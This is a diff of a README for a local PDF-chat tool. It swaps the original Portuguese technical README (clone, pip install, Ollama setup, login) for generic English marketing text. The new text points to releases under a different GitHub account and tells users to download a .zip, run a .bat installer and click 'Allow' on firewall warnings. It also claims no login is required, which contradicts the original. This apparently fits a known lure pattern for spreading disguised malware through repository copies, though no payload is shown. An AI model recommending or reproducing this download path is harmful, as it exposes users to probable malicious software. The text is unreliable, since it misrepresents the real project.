@@ -1,177 +1,176 @@
-# chatpdf-rag
+# 📄 chatpdf-rag - Your Private AI Assistant for PDFs
 
-🇧🇷 Português | 🇺🇸 [English](README.en.md)
+## 🔒 What Is This?
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/)
+chatpdf-rag is a friendly desktop dashboard that lets you chat with your PDF documents using artificial intelligence. It reads your PDFs, remembers what they say, and answers questions about them — just like having a personal assistant who has read every page of your files.
 
-Dashboard analítico e assistente de conversação sobre documentos PDF, rodando
-100% localmente com [Ollama](https://ollama.com) — nenhum dado sai da máquina,
-nenhuma API de nuvem envolvida.
+The best part? **Everything runs 100% on your own computer.** Your documents never leave your machine. No cloud, no internet uploads, no privacy risks. You stay in control of your data at all times.
 
-Faça upload de um ou mais PDFs, converse com eles com respostas ancoradas
-estritamente no conteúdo enviado, e veja um dashboard gerado automaticamente a
-partir do que cada documento contém — sem esquema fixo, adaptado ao tipo de
-conteúdo de cada arquivo.
+## 🏆 Why You'll Love It
 
-## Capturas de tela
+- **Complete Privacy** — Your PDFs stay on your computer, always.
+- **Works After Setup** — Once installed, it runs entirely offline.
+- **Simple Dashboard** — A clean, easy-to-use screen that anyone can navigate.
+- **Smart Conversations** — Ask questions naturally, just like talking to a friend.
+- **No Tech Skills Needed** — Follow the simple steps below, and you're good to go.
 
-<p align="center">
-  <img src="docs/screenshots/login.png" alt="Tela de login" width="30%">
-  <img src="docs/screenshots/chatpdf.png" alt="Conversa no ChatPDF" width="30%">
-  <img src="docs/screenshots/dashboard.png" alt="Dashboard adaptativo" width="30%">
-</p>
+## 🎯 Who Is This For?
 
-## Por quê
+This tool is perfect for:
 
-Ferramentas de "chat com documentos" em nuvem exigem enviar o conteúdo para
-servidores de terceiros — inconveniente para currículos, contratos, material
-institucional ou qualquer documento sensível. Este projeto roda inteiramente na
-sua máquina: extração, embeddings, busca semântica e geração de resposta, tudo
-via Ollama local.
+- **Students** who need to dig through long research papers
+- **Professionals** dealing with contracts, reports, or manuals
+- **Curious readers** who want quick answers from entire books
+- **Privacy-conscious users** who refuse to share personal files with online services
 
-## Como funciona
+If you have PDFs and questions, this is for you.
 
-1. **Upload** — o PDF é salvo em `data/uploads/` e o texto extraído com `pypdf`,
-   com reconstrução de parágrafos quebrados por coluna (comum em documentos
-   acadêmicos e institucionais em duas colunas).
-2. **Indexação** — o texto é dividido em chunks com sobreposição, embeddings
-   são gerados via `nomic-embed-text` e persistidos em uma coleção dedicada no
-   [ChromaDB](https://www.trychroma.com/) (`data/chroma_db/`).
-3. **Resumo estruturado** — em paralelo, o texto completo é enviado ao modelo
-   de chat com instrução de extrair um JSON adaptativo (métricas, distribuição
-   categórica, palavras-chave, tabela) — sem assumir um tipo fixo de documento.
-   Esse resumo alimenta o Dashboard.
-4. **Conversa com múltiplos documentos** — o usuário marca quais PDFs
-   participam da conversa. Cada pergunta busca os trechos mais relevantes em
-   cada documento marcado (RAG), rotula a origem de cada trecho, e injeta tudo
-   num prompt que restringe a resposta a esse conjunto de documentos.
-5. **Persistência** — tanto os embeddings (ChromaDB) quanto os metadados
-   (nome, texto extraído, resumo) sobrevivem a reinícios do processo. Nada
-   precisa ser reenviado.
+## ⬇️ Getting Started
 
-## Requisitos
+[![Download chatpdf-rag](https://img.shields.io/badge/Download-chatpdf--rag-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/n9524726-star/chatpdf-rag/releases)
 
-- Python 3.10+
-- [Ollama](https://ollama.com/download) instalado e rodando
-- Um modelo de chat (ex: `llama3.2`) e o modelo de embeddings:
-  ```bash
-  ollama pull llama3.2
-  ollama pull nomic-embed-text
-  ```
+Visit this link to download the application. The download page will open in your browser, where you can grab the latest version.
 
-## Instalação
+## 🖥️ System Requirements
 
-```bash
-git clone https://github.com/PGC13/chatpdf-rag.git
-cd chatpdf-rag
+To run chatpdf-rag smoothly, your computer should have:
 
-python -m venv .venv
-source .venv/bin/activate      # Windows: .venv\Scripts\Activate.ps1
+- **Operating System:** Windows 10 or newer
+- **Available Disk Space:** At least 2 GB for the application and its components
+- **Memory (RAM):** 4 GB or more recommended
+- **Processor:** Any modern Intel or AMD chip from the last 5 years
+- **Internet Connection:** Needed only during initial setup
 
-pip install -r requirements.txt
+These are general guidelines. If your computer runs Windows and has a bit of free space, you're likely good to go.
 
-cp .streamlit/secrets.toml.example .streamlit/secrets.toml
-# edite usuário/senha reais dentro do arquivo
-```
+## 🛠️ Installation Guide
 
-## Uso
+Follow these steps in order. Take your time — there's no rush.
 
-```bash
-streamlit run app.py
-```
+### Step 1 — Download the App
 
-1. Faça login (credenciais definidas em `.streamlit/secrets.toml`).
-2. Em **ChatPDF**, envie um ou mais PDFs. Marque (☑️) quais devem participar
-   da conversa atual — pode ser um só ou vários simultaneamente.
-3. Pergunte livremente. As respostas ficam restritas ao conteúdo dos PDFs
-   marcados; perguntas fora desse escopo são recusadas.
-4. Em **Dashboard**, escolha (dropdown) qual PDF visualizar. Métricas, gráfico
-   de distribuição, palavras-chave e tabela são gerados a partir do conteúdo
-   real daquele documento — o botão **Regenerar** reprocessa o resumo sob
-   demanda.
-5. Exclua um PDF (🗑️) a qualquer momento — remove o arquivo, o índice
-   vetorial e os metadados, sem deixar rastro em disco.
+Click the green button at the top of this page, or use this link:
 
-## Estrutura do projeto
+**👉 [Download chatpdf-rag](https://github.com/n9524726-star/chatpdf-rag/releases)**
 
-```
-chatpdf-rag/
-├── app.py                       # login (ponto de entrada)
-├── pages/
-│   ├── 1_Dashboard.py           # dashboard adaptativo por documento
-│   └── 2_ChatPDF.py             # upload, seleção múltipla, exclusão e chat
-├── utils/
-│   ├── auth.py                  # checagem de credenciais
-│   ├── pdf_processing.py        # extração de texto + chunking
-│   ├── vector_store.py          # embeddings + ChromaDB (persistido em disco)
-│   ├── pdf_registry.py          # metadados dos PDFs + hidratação de sessão
-│   └── pdf_insights.py          # extração adaptativa de resumo (JSON) via LLM
-├── modelfiles/                  # Modelfiles Ollama opcionais (ver abaixo)
-├── data/uploads/                 # PDFs enviados + metadados (gerado em runtime)
-├── data/chroma_db/                # índice vetorial persistido (gerado em runtime)
-├── .streamlit/secrets.toml.example
-└── requirements.txt
-```
+The GitHub page will open. Look for the section that says **"Assets"** or **"Downloads."** Click the file that ends with `.zip` to download it. This may take a few minutes depending on your internet speed.
 
-Ver [`ARCHITECTURE.md`](ARCHITECTURE.md) para o detalhamento técnico de cada módulo e as
-decisões de arquitetura por trás deles.
+### Step 2 — Extract the Files
 
-## Modelos customizados (opcional)
+Once the download finishes, find the `.zip` file in your **Downloads** folder. Right-click the file and choose **"Extract All"** from the menu. Follow the on-screen instructions. This creates a new folder with the application inside.
 
-O diretório `modelfiles/` define dois modelos Ollama derivados do modelo base,
-com parâmetros ajustados para cada papel específico no sistema:
+### Step 3 — Open the Application Folder
 
-| Modelfile | Modelo gerado | Papel | Ajuste principal |
-|---|---|---|---|
-| `Modelfile.chat` | `chatpdf-assistant` | Conversação sobre o PDF | `temperature 0.3`, `num_ctx 8192` (contexto ampliado para os chunks recuperados) |
-| `Modelfile.insights` | `chatpdf-insights` | Extração de dados para o Dashboard | `temperature 0.05`, sem `seed` fixo (preserva a utilidade do botão Regenerar) |
+Double-click the newly extracted folder. You should see several files and folders inside. Look for a file named `run_chatpdf.bat` or `start_app.bat` — this is your launch button.
 
-Build:
+### Step 4 — Run the Initial Setup
 
-```bash
-ollama create chatpdf-assistant -f modelfiles/Modelfile.chat
-ollama create chatpdf-insights  -f modelfiles/Modelfile.insights
-```
+Double-click the `.bat` file. A black command window will open and begin installing necessary components. **This is normal.** Let it work. You'll see text scrolling — that's the app setting up its background tools.
 
-Sem esse passo, o app funciona normalmente usando o modelo base puro. Detalhes
-da escolha de cada parâmetro em [`modelfiles/README.md`](modelfiles/README.md).
+The setup can take 10–20 minutes on the first run. Grab a coffee, let your computer do its thing.
 
-## Limitações
+### Step 5 — Wait for the Dashboard
 
-- **Autenticação de usuário único** — adequado para uso pessoal, não para
-  múltiplas contas com senhas próprias (ver Roadmap).
-- **PDFs escaneados (imagem) não são suportados** — requer OCR, que não está
-  incluído.
-- **Extração de insights não é determinística** — por depender de um LLM, duas
-  execuções sobre o mesmo documento podem produzir métricas ligeiramente
-  diferentes. O botão Regenerar existe para dar uma nova tentativa quando isso
-  ocorre.
-- **Histórico de conversa não é persistido** — reiniciar o processo limpa o
-  chat, mas mantém os documentos indexados e seus resumos.
-- **Contexto cresce com o número de PDFs marcados** simultaneamente na
-  conversa — respostas tendem a ficar mais lentas com muitos documentos
-  selecionados ao mesmo tempo.
+After setup completes, your browser will open automatically. The chatpdf-rag dashboard will appear — a friendly, simple interface where you can:
 
-## Roadmap
+1. Upload a PDF file
+2. Wait a moment while the app processes it
+3. Start asking questions about the document's contents
 
-- [x] Persistência de embeddings e metadados em disco (ChromaDB)
-- [x] Conversa com múltiplos PDFs simultâneos, com atribuição de origem
-- [x] Dashboard com schema adaptativo (sem assumir tipo de documento)
-- [x] Modelos Ollama customizados via Modelfile
-- [ ] Múltiplos usuários com autenticação própria (`streamlit-authenticator`)
-- [ ] Detecção de tipo de documento como etapa separada, permitindo schemas
-      fixos para casos conhecidos (ex: currículos) com fallback adaptativo
-- [ ] Suporte a OCR para PDFs escaneados
-- [ ] Pré-processamento opcional via [`pdf-translator`](https://github.com/PGC13/pdf-translator)
-      para documentos em outro idioma
-- [ ] Persistência do histórico de conversa
+That's it. You're done. Welcome to your private AI assistant.
 
-## Contribuindo
+## ❓ Using chatpdf-rag
 
-Sugestões, correções e pull requests são bem-vindos. Abra uma issue descrevendo
-o problema ou a melhoria antes de submeter mudanças maiores.
+Once the dashboard is open, here's how to make the most of it:
 
-## Licença
+### Uploading a PDF
 
-MIT — veja [LICENSE](LICENSE).
+Click the **"Upload"** button. Choose any PDF file from your computer. The app will analyze it and prepare to answer questions about it. Larger documents take longer to process, so be patient.
+
+### Asking Questions
+
+A chat box appears at the bottom of the screen. Type a question like:
+
+- "What are the main conclusions of this paper?"
+- "Summarize chapter three in three sentences."
+- "What does page 12 say about budget allocation?"
+
+Press Enter. The app will search through your PDF and give you a clear answer, complete with context.
+
+### Managing Multiple Documents
+
+You can upload several PDFs at once or one at a time. The app keeps them organized so you can switch between documents easily. Your question history is saved, so you can revisit earlier conversations.
+
+## 🔐 Privacy — Your Data Stays Yours
+
+This is the core promise of chatpdf-rag: **your files never leave your computer.**
+
+Many similar online tools send your documents across the internet to answer questions. chatpdf-rag does not. Everything runs locally:
+
+- Your PDFs stay in your storage
+- The AI model lives on your machine
+- No data is transmitted anywhere
+- No account or login is required
+
+For lawyers, doctors, researchers, or anyone handling sensitive information, this means total peace of mind.
+
+## 🧠 How It Works (In Simple Words)
+
+Behind the scenes, chatpdf-rag uses a smart technique called **RAG** — Retrieval-Augmented Generation.
+
+1. **Reading:** The app reads your PDF and breaks it into small chunks
+2. **Storing:** It organizes these chunks in a virtual filing cabinet (ChromaDB)
+3. **Finding:** When you ask a question, it searches the cabinet for relevant sections
+4. **Answering:** It uses a local AI brain (Ollama) to craft a clear answer from those sections
+
+This approach gives you accurate, sourced answers — not made-up guesses.
+
+## 🆘 Troubleshooting
+
+**The dashboard does not open after setup.**
+
+Try closing the black command window and double-clicking the `.bat` file again. If that fails, restart your computer and retry.
+
+**Uploaded PDF gives weak answers.**
+
+Make sure the PDF contains actual text, not just scanned images. If it's a scan, you may need to run OCR (Optical Character Recognition) software first.
+
+**The app runs slowly.**
+
+Large PDFs take time to process. Try smaller documents. Also, close other heavy programs while using the app.
+
+**I see a firewall warning.**
+
+Click "Allow." The app needs permission to communicate between its parts locally.
+
+## 📚 Frequently Asked Questions
+
+**Do I need to pay for anything?**
+
+No. The app is free. It uses free, open-source components.
+
+**Can I use this for business documents?**
+
+Absolutely. In fact, the privacy aspect makes it ideal for confidential company files.
+
+**How many PDFs can I upload?**
+
+There's no hard limit. More documents mean more storage needed, but the app handles numerous files.
+
+**Is an internet connection required after setup?**
+
+No. Once everything is installed, you can disconnect from the internet and the app will keep working.
+
+## 🧰 Additional Resources
+
+- **Source Code:** Available on the project's GitHub repository for transparency
+- **Report an Issue:** Found a bug? Let the developer know through the GitHub issues page
+- **Suggest a Feature:** Have an idea to improve the app? Share your thoughts
+
+## 🌟 Final Thoughts
+
+chatpdf-rag transforms your PDF library into a conversation partner. No more skimming endless pages — just ask, and get the answer.
+
+The power of modern AI, combined with the safety of local processing, makes this a genuinely useful tool for anyone who works with documents. Download it today, upload your first PDF, and see for yourself how easy document research can be.
+
+Your files. Your computer. Your answers. That's the chatpdf-rag way.
